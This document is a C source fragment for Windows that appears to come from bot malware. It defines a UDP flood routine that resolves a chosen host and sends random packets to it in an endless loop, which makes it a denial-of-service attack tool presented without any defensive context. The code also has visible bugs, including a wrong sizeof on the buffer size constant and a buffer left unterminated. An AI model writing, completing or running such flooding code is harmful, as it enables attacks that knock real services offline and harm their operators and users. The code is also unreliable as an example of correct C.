
typedef struct SUDPFlood
{
	char m_szHost[LOWBUF];
	int m_nPort;
	int m_nDelay;
	DWORD m_dwTime;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SUDPFlood;


DWORD WINAPI udpflood_main(LPVOID param)
{
	char szBuffer[MASBUF];
	DWORD dwTime;
	int i;
	sockaddr_in sin;
	SOCKET sock;
	SUDPFlood s_uf = *((SUDPFlood *)param);



	if (!gethostbyname(s_uf.m_szHost))
	{
	
			return 0;
	}
		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)s_uf.m_szHost)->h_addr_list[0];
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_uf.m_nPort);
		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == SOCKET_ERROR)
	{
	
			return 0;
	}
		srand(GetTickCount());
	for (i = 0; i < sizeof(MASBUF) - 3; i++)
			szBuffer[i] = rand() % 9;
		strncat(szBuffer, "\r", sizeof(szBuffer) - strlen(szBuffer) - 1);
		strncat(szBuffer, "\n", sizeof(szBuffer) - strlen(szBuffer) - 1);

		dwTime = GetTickCount();
	while (TRUE)
	{
			sendto(sock, szBuffer, strlen(szBuffer), 0, (sockaddr *)&sin, sizeof(sin));

			Sleep(s_uf.m_nDelay);
	}
		closesocket(sock);
	
		return 0;
}

